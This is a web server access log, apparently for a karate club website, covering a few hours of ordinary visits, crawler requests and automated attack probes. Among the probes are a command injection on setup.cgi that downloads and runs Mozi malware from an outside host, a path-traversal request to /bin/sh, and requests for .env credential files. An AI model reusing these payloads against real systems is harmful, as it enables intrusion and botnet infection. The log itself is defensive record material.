::ffff:157.55.39.169 - - [21/Nov/2022:13:44:29 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.153 - - [21/Nov/2022:13:44:46 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:203.10.99.204 - - [21/Nov/2022:13:44:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [21/Nov/2022:13:53:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:212.102.40.2 - - [21/Nov/2022:14:00:27 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:212.102.40.2 - - [21/Nov/2022:14:00:30 +0000] "POST /sendemail HTTP/1.1" 302 94 "https://wadokikai.org" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:212.102.40.2 - - [21/Nov/2022:14:00:31 +0000] "GET /?msg=sent&s=1 HTTP/1.1" 200 57778 "https://wadokikai.org/sendemail" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:152.89.196.211 - - [21/Nov/2022:14:09:36 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:34.221.225.195 - - [21/Nov/2022:14:14:06 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.164.83.32 - - [21/Nov/2022:14:14:31 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.89.91.150 - - [21/Nov/2022:14:14:38 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.89.91.150 - - [21/Nov/2022:14:14:44 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.85.62.158 - - [21/Nov/2022:14:15:16 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:93.159.230.83 - - [21/Nov/2022:14:16:25 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
::ffff:34.217.91.66 - - [21/Nov/2022:14:17:02 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.217.91.66 - - [21/Nov/2022:14:17:03 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.217.91.66 - - [21/Nov/2022:14:17:32 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.217.91.66 - - [21/Nov/2022:14:17:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:32 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:35 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:39 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:43 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:20:47 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:22:39 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:22:43 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:152.89.196.211 - - [21/Nov/2022:14:25:24 +0000] "GET /console/ HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:175.107.0.17 - - [21/Nov/2022:14:31:29 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.107.0.179:37468/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:152.89.196.211 - - [21/Nov/2022:14:32:28 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:34.145.91.254 - - [21/Nov/2022:14:39:31 +0000] "OPTIONS / HTTP/1.0" 200 8 "-" "-"
::ffff:154.54.249.174 - - [21/Nov/2022:14:39:53 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
::ffff:154.54.249.175 - - [21/Nov/2022:14:40:19 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)"
::ffff:152.89.196.211 - - [21/Nov/2022:14:41:13 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:203.10.99.204 - - [21/Nov/2022:14:43:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:152.89.196.211 - - [21/Nov/2022:14:46:19 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:223.247.179.42 - - [21/Nov/2022:14:49:20 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:141.255.166.2 - - [21/Nov/2022:14:49:31 +0000] "GET / HTTP/1.1" 200 57378 "-" "Hello World"
::ffff:203.10.99.204 - - [21/Nov/2022:14:51:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:40.77.167.4 - - [21/Nov/2022:14:54:23 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:136.24.141.37 - - [21/Nov/2022:14:57:25 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [21/Nov/2022:14:57:29 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:152.89.196.211 - - [21/Nov/2022:15:01:23 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 404 174 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:152.89.196.211 - - [21/Nov/2022:15:03:23 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:152.89.196.211 - - [21/Nov/2022:15:11:54 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:95.214.235.205 - - [21/Nov/2022:15:15:35 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [21/Nov/2022:15:15:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:203.10.99.204 - - [21/Nov/2022:15:16:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:114.119.133.245 - - [21/Nov/2022:15:19:56 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:34.102.14.165 - - [21/Nov/2022:15:24:07 +0000] "OPTIONS / HTTP/1.0" 200 8 "-" "-"
::ffff:60.191.125.35 - - [21/Nov/2022:15:24:48 +0000] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
::ffff:203.10.99.204 - - [21/Nov/2022:15:24:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:5.188.210.227 - - [21/Nov/2022:15:25:55 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 147 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:135.125.217.54 - - [21/Nov/2022:15:30:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [21/Nov/2022:15:30:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:203.10.99.204 - - [21/Nov/2022:15:49:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:192.241.209.98 - - [21/Nov/2022:15:51:19 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 169 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.55.39.159 - - [21/Nov/2022:15:54:33 +0000] "GET /images/karatedo.jpg HTTP/1.1" 404 158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:203.10.99.204 - - [21/Nov/2022:15:58:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:40.77.167.4 - - [21/Nov/2022:16:05:29 +0000] "GET /images/schools/dcakaratedo.jpg HTTP/1.1" 200 458708 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:203.10.99.204 - - [21/Nov/2022:16:06:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:51.254.59.113 - - [21/Nov/2022:16:13:26 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:114.119.145.205 - - [21/Nov/2022:16:15:33 +0000] "GET /joinemail?type=tournaments HTTP/1.1" 200 8829 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:203.10.99.204 - - [21/Nov/2022:16:31:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /resources HTTP/1.1" 200 194907 "https://search.yahoo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/tm.jpg HTTP/1.1" 200 25020 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 200 13951 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 200 7644 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 200 3760 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 200 2677 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/MBS.gif HTTP/1.1" 200 13195 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/bookoffiverings.jpg HTTP/1.1" 200 2940 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 200 4046 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 200 3631 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 200 2813 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 200 3043 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/bobook.gif HTTP/1.1" 200 6919 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 200 1934 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 200 3442 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 200 12021 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 200 3457 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 200 3578 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 200 4025 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 200 22573 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:32 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:24.130.54.41 - - [21/Nov/2022:16:33:36 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
